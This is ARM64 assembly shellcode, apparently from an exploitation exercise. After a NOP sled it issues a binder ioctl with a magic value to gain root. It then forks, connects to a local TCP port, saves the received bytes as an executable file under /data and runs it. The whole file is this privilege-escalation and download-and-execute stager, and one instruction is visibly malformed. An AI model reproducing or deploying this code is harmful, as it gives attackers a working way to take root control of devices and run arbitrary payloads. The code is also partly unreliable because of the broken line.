  .text
  .globl _start

_start:
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  nop;
  sub sp, sp, 512;

  // begin get root

  mov  w0, 0x642f;
  movk w0, 0x7665, lsl 16;
  str w0, [sp, -8];

  mov  w0, 0x622f;
  movk w0, 0x6e69, lsl 16;

  str w0, [sp, -4];

  mov  w0, 0x6564;
  movk w0, 0x0072, lsl 16;
  str w0, [sp];

  sub x1, sp, 8;
  mov w2, 0;
  mov w3, 0;
  mov x8, 56;
  svc 0;

  // save binder fd
  mov x11, x0;

  mov  w1, 0xbeef;
  movk w1, 0xdead, lsl 16;
  mov w2, 0;
  mov x8, 29;
  svc 0;
  mov x8, 174;
  svc 0;

  // end get root


  // begin fork


  mov  x0, 0;                     // #0
  mov  x1, 0;                     // #0
  mov  w2, 0x8011;                    // #17
  movk w2, 0x120, lsl #16;
  mov  x3, 0;                     // #0
  mov  x4, 0;                     // #0
  mov  x5, 0;
  mov  x6, 0;
  mov  x8, 220;
  svc 0;

  cmp x0, 0;
  bne done;

  // end fork

  // begin socket

  // AF_INET
  mov x0, 2;
  // SOCK_STREAM
  mov x1, 1;
  // protocol
  mov x2, 0;
  // __NR_SOCKET = 198
  mov x8, 198;
  // SYSCALL
  svc 0;

  //end socket 

  // save socket fd in x9 for later
  mov x9, x0;


  //begin connect
  // ip 127.0.0.1 port 54321 family AF_INET
  mov  x1, 0x0002;
  movk x1, 0x31d4, lsl 16;
  movk x1, 0x007f, lsl 32;
  movk x1, 0x0100, lsl 48;

  str x1, [sp, -8];
  str x2, [sp];

  mov x8, 203;
  sub x1, sp, 8;
  mov x2, 16;
  svc 0;

  // end connect

  // begin open
  mov  x0, 0x642f;
  movk x0, 0x7461, lsl 16;
  movk x0, 0x2f61, lsl 32;
  movk x0, 0x7070, lsl 48;
  str x0, [sp, -16];
  mov x0, 0x7472;
  str x0, [sp, -8];

  mov x0, 0xff9c;
  movk x0, 0xffff, lsl 16;
  sub x1, sp
  mov x2, 578;
  mov x3, 511;
  mov x8, 56;
  svc 0;
  // end open

  // store fd in x10
  mov x10, x0;

  // begin recv

  mov x3, 0;
recv_loop:

  mov x0, x9;
  sub x1, sp, 512; 
  mov x2, 512;
  mov x8, 63;
  svc 0;

  cmp x0, 0;
  beq exit;

  mov x2, x0;
  mov x0, x10;
  mov x8, 64;
  svc 0;
  b recv_loop;

  // end recv

exit:
  // close fds
  mov x0, x11;
  mov x8, 57;
  svc 0;

  mov x0, x10;
  svc 0;

  mov x0, x9;
  svc 0;


  mov  x0, 0x642f;
  movk x0, 0x7461, lsl 16;
  movk x0, 0x2f61, lsl 32;
  movk x0, 0x7070, lsl 48;
  str x0, [sp, -16];
  mov x0, 0x7472;
  str x0, [sp, -8];
  sub x0, sp, 16;

  str x0, [sp, -32];
  mov x1, 0;
  str x1, [sp, -24];
  sub x1, sp, 32;

  mov x2, 0;
  mov x8, 221;
  svc 0;

done:
  add sp, sp, 512;
  ret;

